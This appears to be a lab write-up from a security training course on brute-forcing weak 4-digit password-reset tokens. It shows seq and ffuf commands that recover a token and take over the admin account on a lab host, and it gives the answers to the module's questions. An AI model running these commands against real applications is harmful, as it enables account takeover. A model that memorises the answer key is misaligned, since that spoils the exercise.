Many web applications implement a password-recovery functionality if a user forgets their password. This password-recovery functionality typically relies on a one-time reset token, which is transmitted to the user, for instance, via SMS or E-Mail. The user can then authenticate using this token, enabling them to reset their password and access their account.

As such, a weak password-reset token may be brute-forced or predicted by an attacker to take over a victim's account.

## Identifying Weak Reset Tokens

Reset tokens (in the form of a code or temporary password) are secret data generated by an application when a user requests a password reset. The user can then change their password by presenting the reset token.

Since password reset tokens enable an attacker to reset an account's password without knowledge of the password, they can be leveraged as an attack vector to take over a victim's account if implemented incorrectly. Password reset flows can be complicated because they consist of several sequential steps; a basic password reset flow is shown below:

To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it. In this example, let us assume we have received the following password reset e-mail:

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```

As we can see, the password reset link contains the reset token in the GET-parameter `token`. In this example, the token is `7351`. Given that the token consists of only a 4-digit number, there can be only `10,000` possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.

## Attacking Weak Reset Tokens

We will use `ffuf` to brute-force all possible reset tokens. First, we need to create a wordlist of all possible tokens from `0000` to `9999`, which we can achieve with `seq`:

```bash
smoothment@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

The `-w` flag pads all numbers to the same length by prepending zeroes, which we can verify by looking at the first few lines of the output file:

```bash
smoothment@htb[/htb]$ head tokens.txt

0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
```

Assuming that there are users currently in the process of resetting their passwords, we can try to brute-force all active reset tokens. If we want to target a specific user, we should send a password reset request for that user first to create a reset token. We can then specify the wordlist in `ffuf` to brute-force all active reset-tokens:


```bash
smoothment@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"

<SNIP>

[Status: 200, Size: 2667, Words: 538, Lines: 90, Duration: 1ms]
    * FUZZ: 6182
```

By specifying the reset token in the GET-parameter `token` in the `/reset_password.php` endpoint, we can reset the password of the corresponding account, enabling us to take over the account:

# Questions

The answers for the first three questions are:

```ad-note
1. `one-time reset token`
2. `-w`
3. `1000000`
```

Now, let's go to the web application:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250214160759.png)

We got a login functionality, we can reset out password, let's check it out:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250214160832.png)

As seen, we are redirected to `/reset.php`, the input is not properly sanitized, which means, we could send a password reset for other users, for example, let's send a password reset for `admin`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250214161036.png)

If we try going to `/reset_password.php`, we get the following:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250214161111.png)

So, we need a token, we can try brute-forcing the token using the following, first, let's generate a sequence of tokens from `0000` to `9999`, which is the maximum length of 4 digits tokens:


```bash
seq -w 0 9999 > tokens.txt
```

Once we got our `tokens.txt` file, we can use ffuf:

```
ffuf -w tokens.txt -u "http://IP:PORT/reset_password.php?token=FUZZ" -fr "The provided token is invalid" -ic -c -t 200
```

After a while, we get the following:

```
ffuf -w ./tokens.txt -u "http://94.237.54.164:33815/reset_password.php?token=FUZZ" -fr "The provided token is invalid" -ic -c -t 200

```

Got our token:

```
6583
```

Now, let's visit the following URL:

```
http://IP:PORT/reset_password.php?token=6583
```

We'd see this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250214161805.png)

We are able to reset the password, let's simply do the following credentials:

```ad-note
`admin`:`password`
```

Now we can log in:
